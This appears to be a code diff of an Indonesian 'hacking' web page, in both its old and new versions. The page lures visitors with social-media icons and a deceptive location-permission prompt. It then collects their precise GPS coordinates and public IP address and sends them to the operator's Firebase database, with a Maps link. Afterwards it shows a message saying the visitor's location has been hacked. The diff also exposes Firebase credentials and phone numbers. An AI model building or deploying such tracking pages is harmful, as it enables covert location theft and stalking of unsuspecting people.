@@ -1,218 +1,113 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
-  <title>DIZFLYZE HACKING</title>
-  <style>
-    *,*::before,*::after { margin:0; padding:0; box-sizing:border-box; user-select:none; touch-action:none; }
-    html,body {
-      width:100vw; height:100vh; overflow:hidden;
-      background:#000 url('background.jpg') center/cover no-repeat fixed;
-      font-family:'Segoe UI',sans-serif; position:relative;
-    }
+<!DOCTYPE html>  <html lang="id">  
+<head>  
+  <meta charset="UTF-8"/>  
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>  
+  <title>DIZFLYZE HACKING</title>  
+  <style>  
+    *,*::before,*::after { margin:0; padding:0; box-sizing:border-box; user-select:none; touch-action:none; }  
+    html,body { width:100vw; height:100vh; overflow:hidden;  
+      background:#000 url('background.jpg') center/cover no-repeat fixed;  
+      font-family:'Segoe UI',sans-serif; position:relative;  
+    }  
+    #splash { position:absolute; top:0; left:0; width:100%; height:100%; display:flex; align-items:center; justify-content:center; background:#000; z-index:100; }  
+    .spinner { width:60px; height:60px; border:6px solid rgba(255,255,255,0.2); border-top-color:#0f0; border-radius:50%; animation:spin 1s linear infinite; }  
+    @keyframes spin { to { transform:rotate(360deg); } }  
+    @keyframes dropIn { 0% { opacity:0; transform:translateX(-50%) translateY(-40px) scale(0.8); } 80% { opacity:1; transform:translateX(-50%) translateY(10px) scale(1.05); } 100% { opacity:1; transform:translateX(-50%) translateY(0) scale(1); } }  .logo { position:absolute; top:10vh; left:50%; transform:translateX(-50%); background:rgba(0,0,0,0.7); padding:1rem 2rem; border-radius:12px; opacity:0; animation:dropIn 0.8s ease-out 0.5s forwards; z-index:10; }  
+.logo img { height:190px; display:block; }  
+.icon-bar { position:absolute; bottom:11vh; left:50%; transform:translateX(-50%); background:rgba(0,0,0,0.7); padding:.8rem 1.2rem; border-radius:20px; display:flex; gap:1rem; opacity:0; animation:dropIn 0.8s ease-out 1s forwards; z-index:10; }  
+.icon-bar img { width:40px; height:40px; cursor:pointer; transition:transform .2s; }  
+.icon-bar img:active { transform:scale(.9); }  
 
-    #splash { position:absolute; top:0; left:0; width:100%; height:100%; display:flex; align-items:center; justify-content:center; background:#000; z-index:100; }
-    .spinner { width:60px; height:60px; border:6px solid rgba(255,255,255,0.2); border-top-color:#0f0; border-radius:50%; animation:spin 1s linear infinite; }
-    @keyframes spin { to { transform:rotate(360deg); } }
+.modal { position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); display:flex; align-items:center; justify-content:center; visibility:hidden; opacity:0; transition:opacity .3s,visibility .3s; z-index:50; }  
+.modal.active { visibility:visible; opacity:1; }  
+.modal-content { background:transparent; border:2px solid #fff; border-radius:10px; padding:2rem; max-width:320px; text-align:center; color:#fff; animation:dropIn .5s ease-out; }  
+.modal-content h2 { margin-bottom:.75rem; font-size:1.5rem; }  
+.modal-content p { font-size:1rem; line-height:1.4; margin-bottom:1.5rem; }  
+.modal-content button { padding:.75rem 2rem; border:2px solid #0f0; background:transparent; color:#0f0; font-weight:bold; font-size:1rem; border-radius:5px; cursor:pointer; transition:background .2s,color .2s; }  
+.modal-content button:hover { background:#0f0; color:#000; }
 
-    @keyframes dropIn {
-      0% { opacity:0; transform:translateX(-50%) translateY(-40px) scale(0.8); }
-      80% { opacity:1; transform:translateX(-50%) translateY(10px) scale(1.05); }
-      100% { opacity:1; transform:translateX(-50%) translateY(0) scale(1); }
-    }
+  </style>  
+</head>  
+<body>  
+  <div id="splash"><div class="spinner"></div></div>  
+  <div class="logo"><img src="https://iili.io/3gKrF49.md.jpg" alt="logo linux"/></div>  
+  <div class="icon-bar">  
+    <img src="https://img.icons8.com/fluency/48/instagram-new.png" alt="Instagram"/>  
+    <img src="https://img.icons8.com/fluency/48/whatsapp.png" alt="WhatsApp"/>  
+    <img src="https://img.icons8.com/fluency/48/telegram-app.png" alt="Telegram"/>  
+    <img src="https://img.icons8.com/fluency/48/youtube-play.png" alt="YouTube"/>  
+    <img src="https://img.icons8.com/fluency/48/facebook-new.png" alt="Facebook"/>  
+  </div>    <div class="modal" id="permModal">  
+    <div class="modal-content">  
+      <h2>IZINKAN LOKASI</h2>  
+      <p>Membuka aplikasi dalam website membutuhkan izin lokasi<br/>sebagai sumber terpercaya dan untuk melindungi dari serangan seperti bot.</p>  
+      <button id="allowBtn">SETUJU</button>  
+    </div>  
+  </div>    <div class="modal" id="thankModal">  
+    <div class="modal-content">  
+      <h2>YOSKA HACKING</h2>  
+      <p>LOKASI ANDA TELAH DI HACK OLEH YOSKA HACKING</p>  
+      <button id="contactBtn">HUBUNGI SAYA</button>  
+    </div>  
+  </div>    <script type="module">  
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.7.1/firebase-app.js";  
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.7.1/firebase-database.js";  
+  
+    const firebaseConfig = {  
+      apiKey: "AIzaSyDPkjZBssBDUwlm8-w2bDXvmMmv4i_e7b0",  
+      authDomain: "dizhack-98c2b.firebaseapp.com",  
+      databaseURL: "https://dizhack-98c2b-default-rtdb.firebaseio.com",  
+      projectId: "dizhack-98c2b",  
+      storageBucket: "dizhack-98c2b.firebasestorage.app",  
+      messagingSenderId: "445703908115",  
+      appId: "1:445703908115:web:175f2a8372bfda727088e6"  
+    };  
+    const app = initializeApp(firebaseConfig);  
+    const db = getDatabase(app);  
+    const DATA_NODE = "DATA_CEK/FULLDATA";  
+    const WA_NUMBER = "6281374470000";  
+  
+    window.addEventListener("load", () => {  
+      setTimeout(() => document.getElementById("splash").style.display = "none", 800);  
+    });  
+  
+    document.querySelectorAll(".icon-bar img").forEach(icon => {  
+      icon.addEventListener("click", () => document.getElementById("permModal").classList.add("active"));  
+    });  
+  
+    document.getElementById("allowBtn").addEventListener("click", () => {  
+      document.getElementById("permModal").classList.remove("active");  
+      if (!navigator.geolocation) { alert("404 Not Found"); return; }  
+      navigator.geolocation.getCurrentPosition(async pos => {  
+        const lat = pos.coords.latitude, lon = pos.coords.longitude;  
+        const now = new Date();  
+        const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(j => j.ip);  
+        const country = await fetch(  
+          `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`,  
+          { headers: { "User-Agent": "linux-hacking/1.0" } }  
+        ).then(r => r.json()).then(j => j.address?.country || "Unknown");  
+  
+        const payload = {  
+          ipTarget: ip,  
+          proxy: ip + ":8080",  
+          negara: country,  
+          waktu: now.toLocaleTimeString("id-ID", { hour12:false, timeZone:"Asia/Jakarta" }),  
+          tanggal: now.getDate(),  
+          bulan: now.toLocaleString("id-ID", { month:"long", timeZone:"Asia/Jakarta" }),  
+          tahun: now.getFullYear(),  
+          latitude: lat,  
+          longitude: lon,  
+          gmapsLink: `https://maps.google.com/?q=${lat},${lon}`  
+        };  
+        await set(ref(db, DATA_NODE), payload);  
+  
+        document.getElementById("thankModal").classList.add("active");  
+      }, () => { alert("Perizinan lokasi tidak di berikan. Aplikasi tidak dapat di buka."); }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });  
+    });  
+  
+    document.getElementById("contactBtn").addEventListener("click", () => {  
+      window.open(`https://wa.me/${WA_NUMBER}`, "_blank");  
+    });  
+  </script>  </body>  
+</html>  
 
-    .logo { position:absolute; top:10vh; left:50%; transform:translateX(-50%); background:rgba(0,0,0,0.7); padding:1rem 2rem; border-radius:12px; opacity:0; animation:dropIn 0.8s ease-out 0.5s forwards; z-index:10; }
-    .logo img { height:190px; display:block; }
-
-    .icon-bar { position:absolute; bottom:11vh; left:50%; transform:translateX(-50%); background:rgba(0,0,0,0.7); padding:.8rem 1.2rem; border-radius:20px; display:flex; gap:1rem; opacity:0; animation:dropIn 0.8s ease-out 1s forwards; z-index:10; }
-    .icon-bar img { width:40px; height:40px; cursor:pointer; transition:transform .2s; }
-    .icon-bar img:active { transform:scale(.9); }
-
-    .modal { position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); display:flex; align-items:center; justify-content:center; visibility:hidden; opacity:0; transition:opacity .3s,visibility .3s; z-index:50; }
-    .modal.active { visibility:visible; opacity:1; }
-    .modal-content {
-      background:transparent;
-      border:2px solid #fff;
-      border-radius:10px;
-      padding:2rem;
-      max-width:320px;
-      text-align:center;
-      color:#fff;
-      animation:dropIn .5s ease-out;
-      position:relative;
-    }
-    .modal-content p { font-size:1rem; line-height:1.4; margin-bottom:1.5rem; }
-    .modal-content button { padding:.75rem 2rem; border:2px solid #0f0; background:transparent; color:#0f0; font-weight:bold; font-size:1rem; border-radius:5px; cursor:pointer; transition:background .2s,color .2s; }
-    .modal-content button:hover { background:#0f0; color:#000; }
-
-    #denyModal .modal-content {
-      padding-top:3.5rem;   
-    }
-    #denyModal .modal-content > img {
-      position:absolute;
-      left:50%;
-      top:10;                
-      transform:translateX(-50%);
-      width:43px;
-      height:43px;
-    }
-
-    #updateToast {
-      position:fixed; top:1rem; left:50%; transform:translateX(-50%);
-      background:rgba(0,0,0,0.85); border:2px solid #25D366; border-radius:10px;
-      padding:1rem 1.5rem; color:#fff; font-size:0.95rem; z-index:200;
-      display:none; width:90%; max-width:320px; box-shadow:0 2px 6px rgba(0,0,0,0.7);
-      animation:dropIn 0.5s ease-out;
-    }
-    #updateToast .toast-header { position:relative; height:48px; }
-    #updateToast .toast-header img { position:absolute; left:50%; top:0; transform:translateX(-50%); width:48px; height:48px; }
-    #updateToast .toast-close { position:absolute; right:0; top:0; cursor:pointer; font-size:1.2rem; line-height:1; }
-    #updateToast .toast-body { margin:0.75rem 0; line-height:1.4; }
-    #updateToast button { display:block; width:100%; text-align:center; padding:.5rem 0; border:none; border-radius:5px; background:#25D366; color:#000; font-weight:bold; font-size:1rem; cursor:pointer; transition:opacity .2s; }
-    #updateToast button:hover { opacity:0.9; }
-  </style>
-</head>
-<body>
-  <div id="splash"><div class="spinner"></div></div>
-
-  <div class="logo"><img src="https://iili.io/3gKrF49.md.jpg" alt="logo linux"/></div>
-
-  <div class="icon-bar">
-    <img src="https://img.icons8.com/fluency/48/instagram-new.png" alt="Instagram"/>
-    <img src="https://img.icons8.com/fluency/48/whatsapp.png" alt="WhatsApp"/>
-    <img src="https://img.icons8.com/fluency/48/telegram-app.png" alt="Telegram"/>
-    <img src="https://img.icons8.com/fluency/48/youtube-play.png" alt="YouTube"/>
-    <img src="https://img.icons8.com/fluency/48/facebook-new.png" alt="Facebook"/>
-  </div>
-
-  <div class="modal" id="permModal">
-    <div class="modal-content">
-      <h2>IZINKAN LOKASI</h2>
-      <p>
-        Membuka aplikasi dalam website membutuhkan izin lokasi<br/>
-        sebagai sumber terpercaya dan untuk melindungi dari serangan seperti bot.
-      </p>
-      <button id="allowBtn">SETUJU</button>
-    </div>
-  </div>
-
-  <div class="modal" id="thankModal">
-    <div class="modal-content">
-      <h2>YOSKA HACKING</h2>
-      <p>LOKASI ANDA TELAH DI HACK OLEH YOSKA HACKING</p>
-      <button id="contactBtn">HUBUNGI SAYA</button>
-    </div>
-  </div>
-
-  <div class="modal" id="denyModal">
-    <div class="modal-content">
-      <p>Perizinan lokasi tidak di berikan.<br/>Aplikasi tidak dapat di buka.</p>
-      <button id="denyBtn">KEMBALI</button>
-    </div>
-  </div>
-
-  <div id="updateToast">
-    <div class="toast-header">
-      <img src="https://img.icons8.com/color/48/000000/whatsapp--v1.png" alt="WA"/>
-      <span id="toastClose" class="toast-close">&times;</span>
-    </div>
-    <div class="toast-body">
-      New update last version 2.0.1<br/>
-      Full data access<br/>
-      No bug<br/>
-      No delay<br/>
-      Permanen data
-    </div>
-    <button id="updateBtn">UPDATE</button>
-  </div>
-
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.7.1/firebase-app.js";
-    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.7.1/firebase-database.js";
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyDPkjZBssBDUwlm8-w2bDXvmMmv4i_e7b0",
-      authDomain: "dizhack-98c2b.firebaseapp.com",
-      databaseURL: "https://dizhack-98c2b-default-rtdb.firebaseio.com",
-      projectId: "dizhack-98c2b",
-      storageBucket: "dizhack-98c2b.firebasestorage.app",
-      messagingSenderId: "445703908115",
-      appId: "1:445703908115:web:175f2a8372bfda727088e6"
-    };
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-    const DATA_NODE = "DATA_CEK/FULLDATA";
-    const WA_NUMBER = "6281374470000";
-    const MY_WA = "6281387603153";
-
-    window.addEventListener("load", () => {
-      setTimeout(() => {
-        document.getElementById("splash").style.display = "none";
-        document.getElementById("updateToast").style.display = "block";
-      }, 800);
-    });
-
-    document.getElementById("toastClose").addEventListener("click", () => {
-      document.getElementById("updateToast").style.display = "none";
-    });
-    document.getElementById("updateBtn").addEventListener("click", () => {
-      window.open(`https://wa.me/${MY_WA}`, "_blank");
-      document.getElementById("updateToast").style.display = "none";
-    });
-
-    document.querySelectorAll(".icon-bar img").forEach(icon => {
-      icon.addEventListener("click", () => {
-        if (document.getElementById("updateToast").style.display === "block") return;
-        document.getElementById("permModal").classList.add("active");
-      });
-    });
-
-    document.getElementById("allowBtn").addEventListener("click", () => {
-      document.getElementById("permModal").classList.remove("active");
-      if (!navigator.geolocation) {
-        showDenyModal();
-        return;
-      }
-      navigator.geolocation.getCurrentPosition(async pos => {
-        const lat = pos.coords.latitude, lon = pos.coords.longitude;
-        const now = new Date();
-        const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(j => j.ip);
-        const country = await fetch(
-          `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`,
-          { headers: { "User-Agent": "linux-hacking/1.0" } }
-        ).then(r => r.json()).then(j => j.address?.country || "Unknown");
-
-        const payload = {
-          ipTarget: ip,
-          proxy: ip + ":8080",
-          negara: country,
-          waktu: now.toLocaleTimeString("id-ID", { hour12:false, timeZone:"Asia/Jakarta" }),
-          tanggal: now.getDate(),
-          bulan: now.toLocaleString("id-ID", { month:"long", timeZone:"Asia/Jakarta" }),
-          tahun: now.getFullYear(),
-          latitude: lat,
-          longitude: lon,
-          gmapsLink: `https://maps.google.com/?q=${lat},${lon}`
-        };
-        await set(ref(db, DATA_NODE), payload);
-        document.getElementById("thankModal").classList.add("active");
-      }, () => {
-        showDenyModal();
-      }, { enableHighAccuracy:true, timeout:10000, maximumAge:0 });
-    });
-
-    document.getElementById("contactBtn").addEventListener("click", () => {
-      window.open(`https://wa.me/${WA_NUMBER}`, "_blank");
-    });
-
-    function showDenyModal(){
-      document.getElementById("denyModal").classList.add("active");
-    }
-    document.getElementById("denyBtn").addEventListener("click", () => {
-      document.getElementById("denyModal").classList.remove("active");
-    });
-
-  </script>
-</body>
-</html>
